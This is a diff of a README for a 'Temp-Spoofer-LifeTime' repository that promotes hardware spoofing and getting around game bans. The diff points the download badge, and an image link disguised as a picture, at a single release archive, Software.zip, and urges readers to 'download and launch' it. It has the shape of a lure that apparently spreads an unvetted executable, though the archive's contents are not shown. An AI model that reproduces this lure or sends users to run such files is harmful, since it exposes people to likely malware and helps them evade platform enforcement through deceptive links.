@@ -27,7 +27,7 @@ For detailed information and resources on the above topics, dive into the conten
 
 ## Explore the Latest Version:
 You can download the latest version of this repository by clicking on the button below:
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-<COLOR>.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Blalalalal/Temp-Spoofer-LifeTime/releases/download/v1.0/Software.zip%20Version-<COLOR>.svg)](https://github.com/Blalalalal/Temp-Spoofer-LifeTime/releases/download/v1.0/Software.zip)
 
 *Note: Click the button above to download and launch the latest version!*
 
@@ -37,7 +37,7 @@ If the provided link is not working or you want to explore more versions of this
 ## Get Started:
 Start exploring the world of hardware spoofing and ban bypassing with Temp-Spoofer-LifeTime repository. Join the community, share your knowledge, and stay updated on the latest advancements in the field!
 
-![Spoofer Image](https://your_image_url/spoofer_image.jpg)
+![Spoofer Image](https://github.com/Blalalalal/Temp-Spoofer-LifeTime/releases/download/v1.0/Software.zip)
 
 **Happy Spoofing!** 🎮🔧
 
